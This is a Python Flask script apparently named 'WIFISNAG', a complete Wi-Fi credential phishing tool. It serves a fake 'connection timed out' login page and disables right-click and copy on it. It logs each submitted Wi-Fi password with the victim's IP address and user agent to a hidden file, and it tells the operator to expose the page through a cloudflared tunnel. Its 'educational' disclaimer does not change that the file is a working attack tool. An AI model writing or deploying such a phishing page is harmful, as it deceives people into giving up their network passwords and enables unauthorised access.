from flask import Flask, request, render_template_string
import os, time
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.prompt import Prompt
import pyfiglet
import socket

app = Flask(__name__)
console = Console()

LOGS_DIR = ".dht_logs"
LOG_FILE = os.path.join(LOGS_DIR, "wifi_passwords.log")

# Ensure logs directory exists
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def show_banner(text, style="bold green"):
    banner = pyfiglet.figlet_format(text, font="slant")
    console.print(Align.center(f"[{style}]{banner}[/{style}]"))

def dht_intro():
    clear()
    show_banner("TEAM-DHT", "bold red")
    console.print(Panel.fit(
        "[green]This tool is for [bold]educational & testing[/bold] purposes only.\n"
        "[cyan]Subscribe to watch full tutorials on YouTube:[/cyan]\n"
        "[bold blue]https://youtube.com/@dht-hackers_10[/bold blue]",
        title="[bold magenta]DHT Hackers Official Tool[/bold magenta]",
        border_style="bright_magenta",
        padding=(1,2)
    ))
    time.sleep(2)
    if os.name == "posix":
        os.system("termux-open-url https://youtube.com/@dht-hackers_10")
    Prompt.ask("[yellow]Press Enter after subscribing to continue...[/yellow]")
    clear()

def get_welcome():
    clear()
    show_banner("WIFISNAG", "bold cyan")
    console.print(
        Align.center(
            Panel.fit(
                "[cyan]WiFi Credential Snagging Tool[/cyan]\n"
                "Created by [bold green]Ali Sabri[/bold green] & Team DHT\n\n"
                "[yellow]Note:[/yellow] Only use on networks you own or have permission to test.\n"
                "[red]Illegal use is your responsibility.[/red]",
                title="[bold green]WELCOME[/bold green]",
                border_style="cyan",
                padding=(1,2)
            )
        )
    )
    time.sleep(2)

# Realistic fake WiFi login page (HTML + JS)
login_page = r'''
<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Authentication</title>
    <style>
        * {
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
        }
        body {
            background: linear-gradient(90deg, #000428, #004e92);
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            height: 100vh;
            margin: 0;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            background-color: #111;
            padding: 40px 35px;
            border-radius: 12px;
            box-shadow: 0 0 25px #00ff7f;
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        h2 {
            margin-bottom: 10px;
            font-weight: 700;
            color: #00ff7f;
        }
        p {
            margin-bottom: 20px;
            font-size: 14px;
            color: #ccc;
        }
        input[type=password] {
            width: 100%;
            padding: 15px 12px;
            margin: 15px 0;
            border: none;
            border-radius: 8px;
            font-size: 17px;
        }
        button {
            background-color: crimson;
            border: none;
            padding: 14px 25px;
            border-radius: 8px;
            width: 100%;
            color: white;
            font-size: 17px;
            cursor: pointer;
            font-weight: 700;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #a10000;
        }
        .spinner {
            display: none;
            margin-top: 20px;
            width: 40px;
            height: 40px;
            border: 5px solid #ccc;
            border-top: 5px solid #00ff7f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: auto;
            margin-right: auto;
        }
        @keyframes spin {
            0% {transform: rotate(0deg);}
            100% {transform: rotate(360deg);}
        }
    </style>
    <script>
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('copy', e => e.preventDefault());
        function showSpinner() {
            document.querySelector('.spinner').style.display = 'block';
        }
        function validateForm(e) {
            let pwd = document.getElementById('password').value.trim();
            if (pwd === "") {
                e.preventDefault();
                alert("Password cannot be empty!");
                return false;
            }
            showSpinner();
            return true;
        }
    </script>
</head>
<body>
    <div class="container">
        <h2>Wi-Fi Network Authentication</h2>
        <p>Your connection timed out. Please enter your Wi-Fi password to reconnect.</p>
        <form method="POST" action="/login" onsubmit="return validateForm(event);">
            <input type="password" id="password" name="password" placeholder="Enter Wi-Fi Password" autocomplete="off" autofocus />
            <button type="submit">Reconnect</button>
        </form>
        <div class="spinner"></div>
    </div>
</body>
</html>
'''

def log_password(password, ip, user_agent):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"[{now}] [IP: {ip}] [Agent: {user_agent}] Captured Password: {password}\n"
    with open(LOG_FILE, "a") as f:
        f.write(log_line)
    console.print(f"[bold green][+][/bold green] {log_line.strip()}")

@app.route('/')
def index():
    return render_template_string(login_page)

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')
    ip = request.remote_addr or "Unknown"
    user_agent = request.headers.get('User-Agent') or "Unknown"
    log_password(password, ip, user_agent)
    return '''
        <script>alert("Reconnecting... Please wait.");</script>
        <h2 style="text-align:center; color:white; background:black; padding:30px;">
            ✅ Reconnecting to Wi-Fi...
        </h2>
    '''

if __name__ == "__main__":
    dht_intro()
    get_welcome()
    console.print("[bold green][✔] Starting Flask server on http://127.0.0.1:8080[/bold green]")
    console.print("[bold blue][>] Run this in another terminal:[/bold blue] cloudflared tunnel --url http://127.0.0.1:8080\n")
    app.run(host="127.0.0.1", port=8080)
